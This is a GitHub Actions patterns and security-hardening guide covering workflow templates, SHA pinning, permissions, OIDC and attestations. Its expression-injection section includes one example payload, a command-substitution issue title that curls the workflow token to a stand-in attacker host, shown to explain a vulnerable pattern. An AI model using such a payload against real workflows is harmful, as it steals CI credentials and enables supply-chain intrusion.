# GitHub Actions: Patterns & Templates

Production-ready patterns for GitHub Actions workflows. Updated for March 2026: ubuntu-24.04
runners, arm64 GA, artifact v4, attestations, SHA pinning enforcement.

---

## Runner Environment

| Label | OS | Architecture | Notes |
|-------|----|-------------|-------|
| `ubuntu-latest` | Ubuntu 24.04 | x86_64 | Alias since Jan 2025. Ubuntu 20.04 retired Apr 2025. |
| `ubuntu-24.04` | Ubuntu 24.04 | x86_64 | Explicit pin (recommended). |
| `ubuntu-22.04` | Ubuntu 22.04 | x86_64 | Will be deprecated eventually. |
| `ubuntu-24.04-arm` | Ubuntu 24.04 | arm64 | GA Aug 2025 (public), Jan 2026 (private). 4 vCPU public, 2 vCPU private. |
| `ubuntu-22.04-arm` | Ubuntu 22.04 | arm64 | Same availability. |
| `macos-15` | macOS 15 | Apple Silicon | M-series. |
| `windows-latest` | Windows Server 2022 | x86_64 | |

**No `ubuntu-latest-arm` label exists.** Use explicit `ubuntu-24.04-arm`.

**Pricing (March 2026)**: hosted runner prices dropped up to 39% on Jan 1, 2026. A planned
$0.002/min self-hosted runner fee was announced but **postponed indefinitely** after community
backlash. Public repo usage remains free.

---

## Workflow Structure

### Minimal CI workflow

```yaml
name: CI
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  ci:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@<sha>        # v4
      - uses: oven-sh/setup-bun@<sha>          # v2
        with:
          bun-version: '1.2'
      - run: bun install --frozen-lockfile
      - run: bun run lint
      - run: bun run typecheck
      - run: bun run test
```

### Multi-job with dependency chain

```yaml
jobs:
  lint:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@<sha>
      - uses: oven-sh/setup-bun@<sha>
      - run: bun install --frozen-lockfile
      - run: bun run lint

  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@<sha>
      - uses: oven-sh/setup-bun@<sha>
      - run: bun install --frozen-lockfile
      - run: bun run test

  build:
    needs: [lint, test]
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@<sha>
      - uses: oven-sh/setup-bun@<sha>
      - run: bun install --frozen-lockfile
      - run: bun run build
      - uses: actions/upload-artifact@<sha>  # v4
        with:
          name: dist
          path: dist/
          retention-days: 7

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-24.04
    environment: production
    steps:
      - uses: actions/download-artifact@<sha>  # v4
        with:
          name: dist
      - run: echo "Deploy here"
```

### Release workflow with SBOM and attestation

```yaml
name: Release
on:
  push:
    tags: ['v*']

permissions:
  contents: write
  packages: write
  id-token: write           # for attestation
  attestations: write       # for attestation

jobs:
  release:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@<sha>

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@<sha>

      - name: Login to GHCR
        uses: docker/login-action@<sha>
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        id: build
        uses: docker/build-push-action@<sha>
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}
          platforms: linux/amd64,linux/arm64
          provenance: true
          sbom: true

      - name: Generate SBOM
        uses: anchore/sbom-action@<sha>
        with:
          image: ghcr.io/${{ github.repository }}:${{ github.ref_name }}
          format: spdx-json
          output-file: sbom.spdx.json

      - name: Attest container image
        uses: actions/attest-build-provenance@<sha>
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true

      - name: Create GitHub release
        run: |
          gh release create "$TAG" \
            --repo "$REPO" \
            --title "$TAG" \
            --generate-notes \
            sbom.spdx.json
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ github.ref_name }}
          REPO: ${{ github.repository }}
```

---

## Security Hardening

### SHA pinning

**Non-negotiable.** All third-party actions MUST be pinned to full 40-character commit SHAs.
Tags are mutable - the tj-actions (March 2025) and Trivy (March 2026) compromises both
exploited tag force-pushing to redirect thousands of repos to malicious code.

```yaml
# vulnerable: tag can be force-pushed at any time
- uses: actions/checkout@v4

# secure: immutable commit reference
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Add version comments** for human readability. Use Dependabot or Renovate to auto-update SHAs:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

**GitHub org-level enforcement** (shipped Aug 2025): admins can require all workflows use
full-length commit SHAs via policy settings. Workflows using tag references fail.

### Permissions (least privilege)

Always declare explicit permissions. Repos created before Feb 2023 still default to read-write.

```yaml
# Workflow-level default (most restrictive)
permissions:
  contents: read

# Job-level override (only where needed)
jobs:
  deploy:
    permissions:
      contents: read
      packages: write
```

Common permission scoping:

| Job type | Permissions needed |
|----------|-------------------|
| CI (lint, test, build) | `contents: read` |
| Push to GHCR | `contents: read`, `packages: write` |
| Create release | `contents: write` |
| Comment on PR | `contents: read`, `pull-requests: write` |
| OIDC auth | `id-token: write` |
| Attestation | `id-token: write`, `attestations: write` |
| Dependabot auto-merge | `contents: write`, `pull-requests: write` |

### Expression injection prevention

`${{ }}` expressions in `run:` blocks are macro-expanded before shell execution. Attacker-controlled
values become arbitrary code.

```yaml
# VULNERABLE: title can contain $(curl attacker.com/steal?t=$GITHUB_TOKEN)
- run: echo "Processing ${{ github.event.issue.title }}"

# SAFE: assigned to env var, shell handles quoting
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Processing $TITLE"
```

**All `github.event.*` fields are attacker-controlled**: issue titles, PR descriptions, branch
names, commit messages, review comments.

### pull_request_target safety

`pull_request_target` runs with the base repo's secrets and permissions, even for fork PRs.

```yaml
# DANGEROUS: checks out attacker's code with base repo secrets
on: pull_request_target
steps:
  - uses: actions/checkout@<sha>
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # attacker's code

# SAFER: only check out base repo code, use PR number for context
on: pull_request_target
steps:
  - uses: actions/checkout@<sha>  # base repo code (default)
  - env:
      PR_NUMBER: ${{ github.event.pull_request.number }}
    run: echo "PR #$PR_NUMBER"
```

Real-world exploitation: HackerBot-Claw (Feb 2026) - automated campaign scanning public repos
for vulnerable `pull_request_target` workflows. Microsoft, Google, Nvidia repos hit.

### Workflow linting with Zizmor

```yaml
lint-workflows:
  runs-on: ubuntu-24.04
  steps:
    - uses: actions/checkout@<sha>
    - uses: woodruffw/zizmor-action@<sha>
```

Zizmor is a static analysis linter specifically for GitHub Actions. Low false-positive rate.
Catches unpinned actions, overly broad permissions, expression injection, and more.

### StepSecurity Harden-Runner

Runtime network egress monitoring. Detected the tj-actions attack anomalies.

```yaml
steps:
  - uses: step-security/harden-runner@<sha>  # v2.14.2 (v2.12.0 min - CVE-2025-32955)
    with:
      egress-policy: audit    # or 'block' for strict mode
  # ... rest of steps
```

**Note**: Harden-Runner v2.12.0+ required (latest: v2.14.2, March 2026). Earlier versions had
a bypass vulnerability (CVE-2025-32955) - Docker group privilege escalation could restore
sudoers and evade detection.

---

## OIDC and Keyless Authentication

GitHub's OIDC provider issues short-lived tokens (10 min) via Sigstore's Fulcio CA, eliminating
long-lived cloud credentials in CI.

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-24.04
    steps:
      - uses: aws-actions/configure-aws-credentials@<sha>
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions
          aws-region: us-east-1
          # No access key needed - OIDC federated identity
```

Works with: AWS (IAM Identity Provider), GCP (Workload Identity Federation), Azure (Federated
Credentials), HashiCorp Vault, Sigstore/cosign.

---

## Artifact Attestations

GA since June 2024. Proves an artifact was built by a specific workflow in a specific repo.

```yaml
- uses: actions/attest-build-provenance@<sha>
  with:
    subject-name: ghcr.io/${{ github.repository }}
    subject-digest: ${{ steps.build.outputs.digest }}
    push-to-registry: true

# Verify locally:
# gh attestation verify ghcr.io/org/repo@sha256:... --owner org
```

Public repos use Sigstore's public-good instance. Private repos use GitHub's private instance.
Attestations include: workflow link, repo, org, environment, commit SHA, trigger event.

---

## Reusable Workflows

Limits (2026): nesting depth 10, total callable workflows 50, dispatch inputs 25.

### Caller

```yaml
jobs:
  ci:
    uses: my-org/.github/.github/workflows/ci.yml@<sha>
    with:
      node-version: '22'
    secrets: inherit  # or explicit mapping
```

### Callee

```yaml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '22'
    secrets:
      DEPLOY_TOKEN:
        required: false

jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with:
          node-version: ${{ inputs.node-version }}
```

**Gotcha**: `inputs.<id>.default` always empty in Forgejo, even though GitHub populates it.
If you share workflows between GitHub and Forgejo, always provide inputs explicitly from the
caller.

---

## Caching

### actions/cache (explicit)

```yaml
- uses: actions/cache@<sha>
  with:
    path: ~/.bun/install/cache
    key: bun-${{ runner.os }}-${{ hashFiles('**/bun.lockb') }}
    restore-keys: |
      bun-${{ runner.os }}-
```

### Setup actions with built-in cache

Many setup actions handle caching automatically:
- `actions/setup-node@v4` - `cache: npm` / `cache: bun`
- `actions/setup-go@v5` - `cache: true` (default)
- `actions/setup-python@v5` - `cache: pip`

### Docker layer caching

```yaml
- uses: docker/build-push-action@<sha>
  with:
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

---

## Matrix Strategies

```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-24.04, ubuntu-24.04-arm]
        node: ['20', '22']
        exclude:
          - os: ubuntu-24.04-arm
            node: '20'
      fail-fast: false
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with:
          node-version: ${{ matrix.node }}
      - run: npm test
```

---

## Concurrency Control

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true  # safe for CI; DANGEROUS for deployment workflows
```

**Never use `cancel-in-progress: true` on deployment workflows.** Canceling a mid-flight
deployment leaves resources in an inconsistent state.

---

## Security Scanning Template

```yaml
security:
  runs-on: ubuntu-24.04
  permissions:
    contents: read
    security-events: write
  steps:
    - uses: actions/checkout@<sha>

    # Dependency audit
    - run: bun audit 2>&1 | tee audit.txt; true
    - run: |
        if grep -qiE '(high|critical)' audit.txt; then
          echo "::warning::HIGH/CRITICAL vulnerabilities found"
        fi

    # Container scan (pin to known-safe version post-Trivy compromise)
    - uses: aquasecurity/trivy-action@<sha>  # v0.35.0 (verified safe)
      with:
        image-ref: ghcr.io/${{ github.repository }}:${{ github.sha }}
        format: sarif
        output: trivy.sarif
        severity: HIGH,CRITICAL

    # Upload to GitHub Security tab
    - uses: github/codeql-action/upload-sarif@<sha>
      with:
        sarif_file: trivy.sarif
```

**Trivy safe versions (March 2026)**: binary v0.69.3, `trivy-action@v0.35.0`,
`setup-trivy@v0.2.6`. Do NOT use v0.69.4/5/6 (compromised by TeamPCP).

---

## Common Gotchas

- **Artifact v4 breaking change**: v3 stopped working Jan 30, 2025. Hidden files (`.env`) excluded
  by default in v4 (included in v3). Workflows relying on hidden file upload break silently.
- **Path filters + required checks**: if path filter skips the workflow, the required status check
  never reports, blocking merges. Use a separate always-running workflow for the status check.
- **Concurrency group deadlock**: same group at workflow AND job level creates a deadlock. Pick one.
- **Reusable workflow input defaults**: always provide inputs explicitly from the caller for
  cross-platform compatibility (Forgejo ignores defaults).
- **`needs` referencing excluded jobs**: a job with `needs: [excluded-job]` fails with "job not found"
  when the needed job is excluded by an `if:` condition. Use `if: always() && needs.job.result != 'skipped'`.
